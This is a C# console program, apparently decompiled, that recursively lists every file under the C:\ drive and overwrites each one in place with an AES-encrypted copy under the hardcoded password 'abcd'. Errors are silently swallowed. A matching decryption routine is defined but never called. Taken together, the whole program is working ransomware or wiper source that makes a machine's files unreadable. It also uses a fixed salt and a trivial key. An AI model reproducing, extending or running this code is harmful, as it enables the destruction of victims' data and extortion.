using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace ConsoleApp2;

internal class Program
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			try
			{
				File.WriteAllBytes(file, bytes2);
			}
			catch (UnauthorizedAccessException)
			{
			}
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	public static class FileDirectorySearcher
	{
		public static IEnumerable<string> Search(string searchPath, string searchPattern)
		{
			IEnumerable<string> files2 = GetFileSystemEntries(searchPath, searchPattern);
			foreach (string item in files2)
			{
				yield return item;
			}
			IEnumerable<string> directories = GetDirectories(searchPath);
			foreach (string directory in directories)
			{
				files2 = Search(directory, searchPattern);
				foreach (string item2 in files2)
				{
					yield return item2;
				}
			}
		}

		private static IEnumerable<string> GetDirectories(string directory)
		{
			IEnumerable<string> subDirectories = null;
			try
			{
				subDirectories = Directory.EnumerateDirectories(directory, "*.*", SearchOption.TopDirectoryOnly);
			}
			catch (UnauthorizedAccessException)
			{
			}
			if (subDirectories == null)
			{
				yield break;
			}
			foreach (string item in subDirectories)
			{
				yield return item;
			}
		}

		private static IEnumerable<string> GetFileSystemEntries(string directory, string searchPattern)
		{
			IEnumerable<string> files = null;
			try
			{
				files = Directory.EnumerateFileSystemEntries(directory, searchPattern, SearchOption.TopDirectoryOnly);
			}
			catch (UnauthorizedAccessException)
			{
			}
			if (files == null)
			{
				yield break;
			}
			foreach (string item in files)
			{
				yield return item;
			}
		}
	}

	private static void Main(string[] args)
	{
		IEnumerable<string> enumerable = FileDirectorySearcher.Search("C:\\", "*");
		foreach (string item in enumerable)
		{
			EncryptionFile encryptionFile = new EncryptionFile();
			string password = "abcd";
			try
			{
				Console.WriteLine(item);
				encryptionFile.EncryptFile(item, password);
			}
			catch (Exception)
			{
			}
		}
	}
}
